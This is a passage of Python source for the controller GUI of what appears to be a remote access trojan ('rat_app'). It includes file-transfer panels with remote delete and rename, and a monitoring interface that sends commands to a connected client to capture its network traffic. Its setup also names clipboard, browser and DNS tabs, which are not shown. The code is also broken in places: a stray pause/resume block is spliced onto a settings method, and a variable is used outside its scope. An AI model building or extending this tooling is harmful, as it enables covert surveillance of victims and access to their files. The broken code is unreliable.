            self.file_frame.bind("<Control-2>", lambda e: self.transfer_notebook.select(1))  # Download tab
            self.file_frame.bind("<Control-3>", lambda e: self.transfer_notebook.select(2))  # Queue tab
            self.file_frame.bind("<Control-4>", lambda e: self.transfer_notebook.select(3))  # History tab
            
            # Queue shortcuts
            self.file_frame.bind("<Control-p>", lambda e: self.process_all_queue())
            
            # Resume shortcuts
            self.file_frame.bind("<Control-r>", lambda e: self.show_resume_dialog())
            
            # File operations
            self.file_frame.bind("<Delete>", lambda e: self.delete_remote_file())
            self.file_frame.bind("<F2>", lambda e: self.rename_remote_file())
            self.file_frame.bind("<Control-n>", lambda e: self.create_remote_folder())
            
            # Filter shortcuts
            self.file_frame.bind("<Control-f>", self.focus_filter)
            
            # Copy path shortcuts
            self.file_frame.bind("<Control-c>", lambda e: self.copy_path_to_clipboard())
    
    def focus_filter(self, event=None):
        """Focus the filter entry field."""
        if hasattr(self, 'filter_entry'):
            self.filter_entry.focus_set()
    
    #--------------------------------------------------------
    # Theme Integration
    #--------------------------------------------------------
    
    def apply_theme(self, theme_name=None):
        """Apply a theme to all UI elements."""
        if theme_name:
            # Update theme
            if hasattr(self.rat_app, 'THEMES') and theme_name in self.rat_app.THEMES:
                self.rat_app.current_theme = theme_name
            elif theme_name in THEMES:
                self.rat_app.current_theme = theme_name
        
        # Get current theme colors
        theme = self.get_theme_colors()
        
        # Apply to various UI elements
        if hasattr(self, 'file_frame'):
            self.file_frame.configure(fg_color=theme["bg_color"])
        
        # Update cards
        for card in ['client_card', 'status_card', 'source_card', 'dest_card', 'info_card']:
            if hasattr(self, card):
                getattr(self, card).configure(fg_color=theme["card_color"])
        
        # Update buttons
        if hasattr(self, 'upload_btn'):
            self.upload_btn.configure(
                fg_color=theme["accent_color"],
                hover_color=theme["hover_color"]
            )
        
        if hasattr(self, 'download_btn'):
            self.download_btn.configure(
                fg_color=theme["accent_color"],
                hover_color=theme["hover_color"]
            )
        
        if hasattr(self, 'cancel_btn'):
            self.cancel_btn.configure(
                fg_color=theme["danger_color"],
                hover_color=theme["hover_color"]
            )
        
        # Update progress bar
        if hasattr(self, 'progress_bar'):
            self.progress_bar.configure(
                progress_color=theme["accent_color"]
            )
        
        # Update treeview styles
        self.configure_treeview_style(theme)
        
        # Update tab styles
        style = ttk.Style()
        style.configure("Custom.TNotebook", background=theme["bg_color"])
        style.map("Custom.TNotebook", background=[("selected", theme["bg_color"])])
    
    #--------------------------------------------------------
    # Settings Management
    #--------------------------------------------------------
    
    def save_settings(self):
        """Save user settings and preferences."""
        settings = {
            # Recent paths
            'recent_upload_paths': getattr(self, 'recent_upload_paths', []),
            'recent_download_paths': getattr(self, 'recent_download_paths', []),
            
            # Default options
            'default_overwrite': getattr(self, 'overwrite_var', tk.BooleanVar(value=True)).get(),
            'default_queue': getattr(self, 'queue_var', tk.BooleanVar(value=False)).get(),
            'default_priority': getattr(self, 'priority_var', tk.StringVar(value="Normal")).get(),
            
            # UI preferences
            'show_hidden_files': self.show_hidden_files,
            
            # Last used paths
            'last_upload_dest': self.upload_dest_entry.get() if hasattr(self, 'upload_dest_entry') else "",
            'last_download_dest': self.download_dest_entry.get() if hasattr(self, 'download_dest_entry') else "",
            'last_remote_path': self.remote_path_entry.get() if hasattr(self, 'remote_path_entry') else "",
            
            # Last selected tab
            'last_tab': self.transfer_notebook.index(self.transfer_notebook.select()) if hasattr(self, 'transfer_notebook') else 0,
            
            # Sort preferences
            'sort_column': getattr(self, 'current_sort_column', "Name"),
            'sort_direction': getattr(self, 'sort_direction', "ascending")
        }
        
        try:
            with open("file_transfer_settings.json", "w") as f:
                json.dump(settings, f)
        except Exception as e:
            self.rat_app.log(f"Error saving settings: {e}")
    
    def load_settings(self):
        """Load user settings and preferences."""
        if not os.path.exists("file_transfer_settings.json"):
            return
            
        try:
            with open("file_transfer_settings.json", "r") as f:
                settings = json.load(f)
                
                # Recent paths
                self.recent_upload_paths = settings.get('recent_upload_paths', [])
                self.recent_download_paths = settings.get('recent_download_paths', [])
                
                # Default options
                if hasattr(self, 'overwrite_var'):
                    self.overwrite_var.set(settings.get('default_overwrite', True))
                if hasattr(self, 'queue_var'):
                    self.queue_var.set(settings.get('default_queue', False))
                if hasattr(self, 'priority_var'):
                    self.priority_var.set(settings.get('default_priority', "Normal"))
                
                # UI preferences
                self.show_hidden_files = settings.get('show_hidden_files', False)
                
                # Update UI for show_hidden_files
                if hasattr(self, 'toggle_hidden_btn'):
                    theme = self.get_theme_colors()
                    self.toggle_hidden_btn.configure(
                        fg_color=theme["accent_color"] if self.show_hidden_files else theme["button_color"]
                    )
                
                # Last used paths
                if settings.get('last_upload_dest') and hasattr(self, 'upload_dest_entry'):
                    self.upload_dest_entry.delete(0, tk.END)
                    self.upload_dest_entry.insert(0, settings.get('last_upload_dest'))
                
                if settings.get('last_download_dest') and hasattr(self, 'download_dest_entry'):
                    self.download_dest_entry.delete(0, tk.END)
                    self.download_dest_entry.insert(0, settings.get('last_download_dest'))
                
                if settings.get('last_remote_path') and hasattr(self, 'remote_path_entry'):
                    self.remote_path_entry.delete(0, tk.END)
                    self.remote_path_entry.insert(0, settings.get('last_remote_path'))
                
                # Sorting preferences
                self.current_sort_column = settings.get('sort_column', "Name")
                self.sort_direction = settings.get('sort_direction', "ascending")
                
                # Select last used tab
                if hasattr(self, 'transfer_notebook'):
                    last_tab = settings.get('last_tab', 0)
                    if 0 <= last_tab < len(self.transfer_notebook.tabs()):
                        self.transfer_notebook.select(last_tab)
                        
        except Exception as e:
            self.rat_app.log(f"Error loading settings: {e}")
    
    #--------------------------------------------------------
    # Additional UI Enhancement Methods
    #--------------------------------------------------------
    
    def add_bookmarks(self, path):
        """Add a path to bookmarks."""
        if not hasattr(self, 'bookmarks'):
            self.bookmarks = []
            
        # Don't add duplicates
        if path not in self.bookmarks:
            self.bookmarks.append(path)
            
        # Save to settings
        self.save_settings()
    
    def show_bookmarks(self):
        """Show a popup with bookmarked locations."""
        if not hasattr(self, 'bookmarks') or not self.bookmarks:
            # If no bookmarks exist, ask to add current path
            if hasattr(self, 'remote_path_entry'):
                current_path = self.remote_path_entry.get()
                if current_path:
                    confirm = messagebox.askyesno("No Bookmarks", 
                                               "No bookmarks found. Add current path?")
                    if confirm:
                        self.add_bookmarks(current_path)
                        messagebox.showinfo("Bookmark Added", f"Added: {current_path}")
                    return
            
            messagebox.showinfo("No Bookmarks", "No bookmarks available")
            return
            
        # Create popup menu for bookmarks
        theme = self.get_theme_colors()
        bookmark_menu = tk.Menu(self.file_frame, tearoff=0)
        
        # Add each bookmark
        for path in self.bookmarks:
            # Create a lambda with path as default argument to avoid late binding issue
            bookmark_menu.add_command(label=path, 
                                  command=lambda p=path: self.navigate_to_bookmark(p))
        
        # Add separator and management options
        bookmark_menu.add_separator()
        bookmark_menu.add_command(label="Add Current Path", 
                              command=self.add_current_to_bookmarks)
        bookmark_menu.add_command(label="Manage Bookmarks", 
                              command=self.manage_bookmarks)
        
        # Show the menu
        try:
            if hasattr(self, 'bookmark_btn'):
                x = self.bookmark_btn.winfo_rootx()
                y = self.bookmark_btn.winfo_rooty() + self.bookmark_btn.winfo_height()
                bookmark_menu.post(x, y)
            else:
                bookmark_menu.post(self.file_frame.winfo_pointerx(), 
                               self.file_frame.winfo_pointery())
        except:
            # Fallback if post fails
            bookmark_menu.post(self.file_frame.winfo_pointerx(), 
                           self.file_frame.winfo_pointery())
    
    def navigate_to_bookmark(self, path):
        """Navigate to a bookmarked path."""
        if hasattr(self, 'remote_path_entry'):
            self.remote_path_entry.delete(0, tk.END)
            self.remote_path_entry.insert(0, path)
            
            # List files in the bookmarked location
            self.list_remote_files()
    
    def add_current_to_bookmarks(self):
        """Add current path to bookmarks."""
        if hasattr(self, 'remote_path_entry'):
            current_path = self.remote_path_entry.get()
            if current_path:
                self.add_bookmarks(current_path)
                messagebox.showinfo("Bookmark Added", f"Added: {current_path}")
    
    def manage_bookmarks(self):
        """Show dialog to manage bookmarks."""
        if not hasattr(self, 'bookmarks'):
            self.bookmarks = []
            
        # Create dialog
        theme = self.get_theme_colors()
        dialog = ctk.CTkToplevel(self.file_frame)
        dialog.title("Manage Bookmarks")
        dialog.geometry("500x300")
        dialog.grab_set()
        
        # Create list frame
        list_frame = ctk.CTkFrame(dialog, fg_color=theme["card_color"],
                              corner_radius=10)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = ctk.CTkLabel(list_frame, text="📚 Manage Bookmarks", 
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                              size=FONT_STYLES["subheading"][1], 
                                              weight=FONT_STYLES["subheading"][2]))
        title_label.pack(anchor="w", padx=15, pady=(10, 15))
        
        # Create listbox for bookmarks
        list_container = ctk.CTkFrame(list_frame, fg_color=theme["bg_color"])
        list_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        listbox = tk.Listbox(list_container, bg=theme["bg_color"], fg=theme["fg_color"], 
                         selectbackground=theme["accent_color"],
                         font=ctk.CTkFont(size=12))
        listbox.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Add scrollbar
        scrollbar = tk.Scrollbar(listbox, orient="vertical", command=listbox.yview)
        listbox.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Add bookmarks to listbox
        for path in self.bookmarks:
            listbox.insert(tk.END, path)
        
        # Button functions
        def remove_selected():
            selection = listbox.curselection()
            if not selection:
                return
                
            # Convert to list of indices and sort in reverse to avoid index shifting
            indices = sorted(list(selection), reverse=True)
            
            # Remove each selected bookmark
            for idx in indices:
                if 0 <= idx < len(self.bookmarks):
                    del self.bookmarks[idx]
            
            # Update listbox
            listbox.delete(0, tk.END)
            for path in self.bookmarks:
                listbox.insert(tk.END, path)
                
            # Save to settings
            self.save_settings()
        
        def add_new():
            new_path = simpledialog.askstring("Add Bookmark", "Enter path:")
            if new_path:
                self.add_bookmarks(new_path)
                
                # Update listbox
                listbox.delete(0, tk.END)
                for path in self.bookmarks:
                    listbox.insert(tk.END, path)
        
        # Button frame
        button_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        remove_btn = ctk.CTkButton(button_frame, text="Remove Selected", 
                                command=remove_selected,
                                fg_color=theme["danger_color"],
                                hover_color=theme["hover_color"],
                                corner_radius=8)
        remove_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        add_btn = ctk.CTkButton(button_frame, text="Add New", 
                             command=add_new,
                             fg_color=theme["button_color"],
                             hover_color=theme["hover_color"],
                             corner_radius=8)
        add_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        close_btn = ctk.CTkButton(button_frame, text="Close", 
                               command=dialog.destroy,
                               fg_color=theme["accent_color"],
                               hover_color=theme["hover_color"],
                               corner_radius=8)
        close_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
    
    def show_recent_paths(self):
        """Show a popup with recent destination paths."""
        if not hasattr(self, 'recent_upload_paths') or not self.recent_upload_paths:
            messagebox.showinfo("No Recent Paths", "No recent paths available")
            return
            
        # Create popup menu for recent paths
        recent_menu = tk.Menu(self.file_frame, tearoff=0)
        
        # Add each recent path
        for path in self.recent_upload_paths:
            recent_menu.add_command(label=path, 
                                command=lambda p=path: self.set_destination_path(p))
        
        # Add separator and clear option
        recent_menu.add_separator()
        recent_menu.add_command(label="Clear Recent Paths", 
                             command=self.clear_recent_paths)
        
        # Show the menu
        try:
            if hasattr(self, 'recent_paths_btn'):
                x = self.recent_paths_btn.winfo_rootx()
                y = self.recent_paths_btn.winfo_rooty() + self.recent_paths_btn.winfo_height()
                recent_menu.post(x, y)
            else:
                recent_menu.post(self.file_frame.winfo_pointerx(), 
                             self.file_frame.winfo_pointery())
        except:
            # Fallback if post fails
            recent_menu.post(self.file_frame.winfo_pointerx(), 
                         self.file_frame.winfo_pointery())
    
    def set_destination_path(self, path):
        """Set the destination path entry."""
        if hasattr(self, 'upload_dest_entry'):
            self.upload_dest_entry.delete(0, tk.END)
            self.upload_dest_entry.insert(0, path)
    
    def clear_recent_paths(self):
        """Clear the list of recent paths."""
        if hasattr(self, 'recent_upload_paths'):
            self.recent_upload_paths = []
            self.save_settings()
            messagebox.showinfo("Cleared", "Recent paths have been cleared")
    
    def update_recent_paths(self, path):
        """Add a path to recent paths list."""
        if not hasattr(self, 'recent_upload_paths'):
            self.recent_upload_paths = []
            
        # Don't add duplicates, move to top if exists
        if path in self.recent_upload_paths:
            self.recent_upload_paths.remove(path)
            
        # Add to beginning of list
        self.recent_upload_paths.insert(0, path)
        
        # Keep only the most recent 10 paths
        self.recent_upload_paths = self.recent_upload_paths[:10]
        
        # Save to settings
        self.save_settings()
    
    #--------------------------------------------------------
    # Main Initialization
    #--------------------------------------------------------
    
    def initialize(self):
        """Initialize the file transfer system with all enhancements."""
        # Load settings first so they're available to UI components
        self.load_settings()
        
        # Load saved history
        self.load_history()
        
        # Setup drag and drop
        self.setup_drag_drop()
        
        # Setup keyboard shortcuts
        self.setup_keyboard_shortcuts()
        
        # Apply current theme
        self.apply_theme()
        
        # Initialize client info
        self.update_client_info()
        
        # Set initial UI state
        self.update_ui_for_transfer(False)
        
        # Auto-refresh file list if on download tab and client connected
        if self.transfer_notebook.index(self.transfer_notebook.select()) == 1:
            if self.rat_app.current_client_socket:
                self.list_remote_files()
        
        # Start auto-save timer for settings (saves every 2 minutes)
        self.file_frame.after(120000, self.auto_save_settings)
    
    def auto_save_settings(self):
        """Automatically save settings periodically."""
        self.save_settings()
        # Schedule next save
        self.file_frame.after(120000, self.auto_save_settings)

        if not hasattr(self, 'is_paused'):
            self.is_paused = False
            
        self.is_paused = not self.is_paused
        
        if self.is_paused:
            # Pause transfer
            self.pause_btn.configure(text="Resume")
            self.status_value.configure(text="Paused")
            
            # Additional pause implementation would depend on 
            # how transfers are handled in the actual system
        else:
            # Resume transfer
            self.pause_btn.configure(text="Pause")
            self.status_value.configure(text="Transferring")
            
            # Additional resume implementation would depend on
            # how transfers are handled in the actual system
            
class AdvancedMonitoringInterface:
    """Interface for advanced monitoring features on the server side"""
    
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        
        # Setup UI
        self.setup_ui()
        
    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return self.rat_app.THEMES[theme_name]
            
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available."""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            tm = self.rat_app.theme_manager
            
            # Register frames
            tm.track_widget(self.advanced_monitoring_frame)
            
            # Register notebooks
            tm.track_widget(self.adv_monitor_notebook, "notebook")
            
            # Register buttons
            for button in self.buttons:
                tm.track_widget(button)
            
            # Register text widgets
            for text_widget in self.text_widgets:
                tm.track_widget(text_widget, "scrolledtext")
            
        tm.track_widget(self.dns_filter_entry)
        tm.track_widget(self.dns_tree, "treeview")
        tm.track_widget(self.dns_status_label)
        tm.track_widget(self.dns_frame)
        tm.track_widget(self.start_dns_btn)
        tm.track_widget(self.stop_dns_btn)
        tm.track_widget(self.save_dns_btn)
        
    def setup_ui(self):
        # Get theme colors
        theme = self.get_theme_colors()
        
        # Create main frame
        self.advanced_monitoring_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.advanced_monitoring_frame, text="Advanced Monitoring")
        
        # Track buttons and text widgets for theme management
        self.buttons = []
        self.text_widgets = []
        
        # Create notebook for different monitoring tabs
        self.adv_monitor_notebook = ttk.Notebook(self.advanced_monitoring_frame, style="Custom.TNotebook")
        self.adv_monitor_notebook.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        # Setup tabs
        self.setup_network_analysis_tab()
        self.setup_clipboard_tab()
        self.setup_browser_tab()
        self.setup_dns_tab()
        self.setup_system_info_tab()
        
        # Register with theme manager
        self.register_with_theme_manager()
    
    
    def setup_network_analysis_tab(self):
        """Setup the network analysis tab with real-time visualization"""
        theme = self.get_theme_colors()
        
        # Create network analysis frame
        self.network_analysis_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["bg_color"])
        self.adv_monitor_notebook.add(self.network_analysis_frame, text="Network Analysis")
        
        # Controls panel
        controls_frame = ctk.CTkFrame(self.network_analysis_frame, fg_color=theme["card_color"], corner_radius=10)
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
        client_label = ctk.CTkLabel(controls_frame, text="Connected Client:", text_color=theme["fg_color"])
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.analysis_client_label = ctk.CTkLabel(controls_frame, text="None", text_color=theme["accent_color"])
        self.analysis_client_label.pack(side=tk.LEFT, padx=5)
        
        # Analysis controls
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.start_analysis_btn = ctk.CTkButton(buttons_frame, text="Start Traffic Analysis", 
                                            command=self.start_traffic_analysis,
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            text_color=theme["fg_color"],
                                            border_color=theme["border_color"],
                                            border_width=1)
        self.start_analysis_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.start_analysis_btn)
        
        self.stop_analysis_btn = ctk.CTkButton(buttons_frame, text="Stop Analysis", 
                                            command=self.stop_traffic_analysis,
                                            state="disabled",
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            text_color=theme["fg_color"],
                                            border_color=theme["border_color"],
                                            border_width=1)
        self.stop_analysis_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.stop_analysis_btn)
        
        # Create tabbed interface for different analysis views
        analysis_notebook = ttk.Notebook(self.network_analysis_frame, style="Custom.TNotebook")
        analysis_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Overview frame with summary metrics
        overview_frame = ctk.CTkFrame(analysis_notebook, fg_color=theme["bg_color"])
        analysis_notebook.add(overview_frame, text="Overview")
        
        # Summary metrics - layout using grid
        metrics_frame = ctk.CTkFrame(overview_frame, fg_color=theme["card_color"], corner_radius=10)
        metrics_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Metrics
        metrics_title = ctk.CTkLabel(metrics_frame, text="Traffic Summary", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]),
                                text_color=theme["accent_color"])
        metrics_title.pack(anchor="w", padx=15, pady=5)
        
        metrics_grid = ctk.CTkFrame(metrics_frame, fg_color="transparent")
        metrics_grid.pack(fill=tk.X, padx=15, pady=5)
        
        # Total packets
        packets_label = ctk.CTkLabel(metrics_grid, text="Total Packets:", text_color=theme["fg_color"])
        packets_label.grid(row=0, column=0, sticky="w", padx=5, pady=2)
        
        self.packets_value = ctk.CTkLabel(metrics_grid, text="0", text_color=theme["accent_color"])
        self.packets_value.grid(row=0, column=1, sticky="w", padx=5, pady=2)
        
        # Total traffic
        traffic_label = ctk.CTkLabel(metrics_grid, text="Total Traffic:", text_color=theme["fg_color"])
        traffic_label.grid(row=1, column=0, sticky="w", padx=5, pady=2)
        
        self.traffic_value = ctk.CTkLabel(metrics_grid, text="0 bytes", text_color=theme["accent_color"])
        self.traffic_value.grid(row=1, column=1, sticky="w", padx=5, pady=2)
        
        # Packets per second
        pps_label = ctk.CTkLabel(metrics_grid, text="Packets/sec:", text_color=theme["fg_color"])
        pps_label.grid(row=0, column=2, sticky="w", padx=5, pady=2)
        
        self.pps_value = ctk.CTkLabel(metrics_grid, text="0", text_color=theme["accent_color"])
        self.pps_value.grid(row=0, column=3, sticky="w", padx=5, pady=2)
        
        # Bandwidth
        bandwidth_label = ctk.CTkLabel(metrics_grid, text="Bandwidth:", text_color=theme["fg_color"])
        bandwidth_label.grid(row=1, column=2, sticky="w", padx=5, pady=2)
        
        self.bandwidth_value = ctk.CTkLabel(metrics_grid, text="0 Mbps", text_color=theme["accent_color"])
        self.bandwidth_value.grid(row=1, column=3, sticky="w", padx=5, pady=2)
        
        # Protocol distribution chart
        self.protocol_frame = ctk.CTkFrame(overview_frame, fg_color=theme["card_color"], corner_radius=10, height=200)
        self.protocol_frame.pack(fill=tk.X, padx=10, pady=10)
        
        protocol_title = ctk.CTkLabel(self.protocol_frame, text="Protocol Distribution", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]),
                                text_color=theme["accent_color"])
        protocol_title.pack(anchor="w", padx=15, pady=5)
        
        # This frame will hold the chart created with matplotlib
        self.protocol_chart_frame = ctk.CTkFrame(self.protocol_frame, fg_color="transparent", height=150)
        self.protocol_chart_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
        
        # Connections frame with active connections list
        connections_frame = ctk.CTkFrame(analysis_notebook, fg_color=theme["bg_color"])
        analysis_notebook.add(connections_frame, text="Connections")
        
        # Create treeview for connections list
        conn_list_frame = ctk.CTkFrame(connections_frame, fg_color=theme["card_color"], corner_radius=10)
        conn_list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        conn_title = ctk.CTkLabel(conn_list_frame, text="Active Connections", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                            size=FONT_STYLES["subheading"][1], 
                                            weight=FONT_STYLES["subheading"][2]),
                                text_color=theme["accent_color"])
        conn_title.pack(anchor="w", padx=15, pady=5)
        
        # Create treeview with columns
        columns = ("Source", "Destination", "Protocol", "Port", "Bytes", "Packets", "Last Seen")
        self.connections_tree = ttk.Treeview(conn_list_frame, columns=columns, 
                                        show="headings", style="Custom.Treeview")
        
        # Configure columns
        for col in columns:
            self.connections_tree.heading(col, text=col)
            if col in ["Source", "Destination"]:
                self.connections_tree.column(col, width=150)
            elif col == "Protocol":
                self.connections_tree.column(col, width=70)
            else:
                self.connections_tree.column(col, width=100)
        
        # Add scrollbar
        conn_scrollbar = ttk.Scrollbar(conn_list_frame, orient=tk.VERTICAL, 
                                    command=self.connections_tree.yview,
                                    style="Custom.Vertical.TScrollbar")
        self.connections_tree.configure(yscroll=conn_scrollbar.set)
        
        # Pack components
        conn_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.connections_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Add filter entry
        filter_frame = ctk.CTkFrame(conn_list_frame, fg_color="transparent")
        filter_frame.pack(fill=tk.X, padx=10, pady=5)
        
        filter_label = ctk.CTkLabel(filter_frame, text="Filter:", text_color=theme["fg_color"])
        filter_label.pack(side=tk.LEFT, padx=5)
        
        self.conn_filter_entry = ctk.CTkEntry(filter_frame, width=200, 
                                            fg_color=theme["input_bg"], 
                                            text_color=theme["fg_color"],
                                            border_color=theme["border_color"],
                                            border_width=1)
        self.conn_filter_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.conn_filter_entry.bind("<KeyRelease>", self.filter_connections)
        
        # Traffic graph frame for visualizing traffic over time
        traffic_frame = ctk.CTkFrame(analysis_notebook, fg_color=theme["bg_color"])
        analysis_notebook.add(traffic_frame, text="Traffic Graph")
        
        graph_frame = ctk.CTkFrame(traffic_frame, fg_color=theme["card_color"], corner_radius=10)
        graph_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        graph_title = ctk.CTkLabel(graph_frame, text="Network Traffic Over Time", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]),
                                text_color=theme["accent_color"])
        graph_title.pack(anchor="w", padx=15, pady=5)
        
        # Frame for the matplotlib traffic graph
        self.traffic_graph_frame = ctk.CTkFrame(graph_frame, fg_color="transparent")
        self.traffic_graph_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
        
        # Time range selection
        timerange_frame = ctk.CTkFrame(graph_frame, fg_color="transparent")
        timerange_frame.pack(fill=tk.X, padx=15, pady=5)
        
        timerange_label = ctk.CTkLabel(timerange_frame, text="Time Range:", text_color=theme["fg_color"])
        timerange_label.pack(side=tk.LEFT, padx=5)
        
        self.timerange_var = tk.StringVar(value="5 minutes")
        timerange_menu = ctk.CTkOptionMenu(timerange_frame, 
                                        values=["1 minute", "5 minutes", "15 minutes", "30 minutes", "1 hour"],
                                        variable=self.timerange_var,
                                        command=self.update_traffic_graph,
                                        fg_color=theme["button_color"],
                                        button_color=theme["accent_color"],
                                        dropdown_fg_color=theme["card_color"],
                                        dropdown_hover_color=theme["hover_color"],
                                        text_color=theme["fg_color"],
                                        dropdown_text_color=theme["fg_color"])
        timerange_menu.pack(side=tk.LEFT, padx=5)
        self.create_frequency_chart()
        
    def start_traffic_analysis(self):
        """Start real-time network traffic analysis"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        # Initialize data structures for analysis
        self.network_data = {
            'start_time': time.time(),
            'total_packets': 0,
            'total_bytes': 0,
            'protocols': {},
            'connections': {},
            'traffic_history': [],  # For the time-series graph
            'last_update': time.time()
        }
        
        try:
            # Send command to start capturing with analysis
            self.rat_app.current_client_socket.send("START_NETWORK_ANALYSIS".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                # Start the analysis update thread
                self.analysis_active = True
                self.analysis_thread = threading.Thread(target=self.update_network_analysis, daemon=True)
                self.analysis_thread.start()
                
                # Update UI
                self.start_analysis_btn.configure(state="disabled")
                self.stop_analysis_btn.configure(state="normal")
                
                # Create initial charts
                self.create_protocol_chart()
                self.create_traffic_graph()
                
                self.rat_app.log("Started network traffic analysis")
            else:
                self.rat_app.log(f"Failed to start network analysis: {response}")
        except Exception as e:
            self.rat_app.log(f"Error starting network analysis: {e}")

    def stop_traffic_analysis(self):
        """Stop real-time network traffic analysis"""
        if self.analysis_active:
            self.analysis_active = False
            
            try:
                self.rat_app.current_client_socket.send("STOP_NETWORK_ANALYSIS".encode())
                self.rat_app.current_client_socket.recv(1024)  # Get acknowledgment
            except:
                pass
            
            # Update UI
            self.start_analysis_btn.configure(state="normal")
            self.stop_analysis_btn.configure(state="disabled")
            
            self.rat_app.log("Stopped network traffic analysis")

    def update_network_analysis(self):
        """Thread to receive and process analysis data"""
        update_interval = 1.0  # seconds between updates
        
        while self.analysis_active:
            try:
                # Request latest analysis data
                self.rat_app.current_client_socket.send("GET_NETWORK_ANALYSIS_DATA".encode())
                
                # Get data size
                size_data = self.rat_app.current_client_socket.recv(8)
                data_size = struct.unpack('Q', size_data)[0]
                
                # Receive data
                data = b""
                while len(data) < data_size:
                    chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                    if not chunk:
                        break
                    data += chunk
                    
                # Parse network data
                network_data = json.loads(data.decode('utf-8'))
                
                # Update our stored data
                self.network_data['total_packets'] = network_data['total_packets']
                self.network_data['total_bytes'] = network_data['total_bytes']
                self.network_data['protocols'] = network_data['protocols']
                
                # Update connections data
                self.network_data['connections'] = network_data['connections']
                
                # Add traffic point for the graph
                current_time = time.time()
                bytes_since_last = network_data['bytes_since_last']
                packets_since_last = network_data['packets_since_last']
                time_diff = current_time - self.network_data['last_update']
                
                if time_diff > 0:
                    bytes_per_sec = bytes_since_last / time_diff
                    packets_per_sec = packets_since_last / time_diff
                    
                    self.network_data['traffic_history'].append({
                        'timestamp': current_time,
                        'bytes_per_sec': bytes_per_sec,
                        'packets_per_sec': packets_per_sec
                    })
                    
                    # Keep only the last hour of data
                    one_hour_ago = current_time - 3600
                    self.network_data['traffic_history'] = [
                        entry for entry in self.network_data['traffic_history'] 
                        if entry['timestamp'] > one_hour_ago
                    ]
                    
                    self.network_data['last_update'] = current_time
                
                # Update UI
                self.advanced_monitoring_frame.after(0, self.update_network_ui)
                
                # Wait before next update
                time.sleep(update_interval)
                
            except Exception as e:
                if not self.analysis_active:
                    break
                self.rat_app.log(f"Error updating network analysis: {e}")
                time.sleep(update_interval)

    def update_network_ui(self):
        """Update the network analysis UI with the latest data"""
        try:
                        
            # Update summary metrics
            self.packets_value.configure(text=str(self.network_data['total_packets']))
            self.traffic_value.configure(text=self.format_size(self.network_data['total_bytes']))
            
            # Calculate current rates
            if self.network_data['traffic_history']:
                latest = self.network_data['traffic_history'][-1]
                self.pps_value.configure(text=f"{latest['packets_per_sec']:.1f}")
                
                # Convert bytes/sec to Mbps
                mbps = (latest['bytes_per_sec'] * 8) / 1_000_000
                self.bandwidth_value.configure(text=f"{mbps:.2f} Mbps")
            
            # Update protocol chart
            self.update_protocol_chart()
            
            # Update connections list
            self.update_connections_list()
            
            # Update traffic graph
            self.update_traffic_graph()
            
            self.update_frequency_chart()
            
        except Exception as e:
            self.rat_app.log(f"Error updating network UI: {e}")

    def create_protocol_chart(self):
        """Create the initial protocol distribution chart"""
        try:
            import matplotlib.pyplot as plt
            from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
            
            # Get theme colors for matplotlib
            theme = self.get_theme_colors()
            
            # Set default matplotlib style to dark theme
            plt.style.use('dark_background')
            
            # Create figure and axis with theme colors
            self.protocol_fig = plt.Figure(figsize=(5, 3), dpi=100, facecolor=theme["card_color"])
            self.protocol_ax = self.protocol_fig.add_subplot(111)
            self.protocol_ax.set_facecolor(theme["card_color"])
            
            # Set text colors to match theme
            self.protocol_ax.tick_params(colors=theme["fg_color"])
            for spine in self.protocol_ax.spines.values():
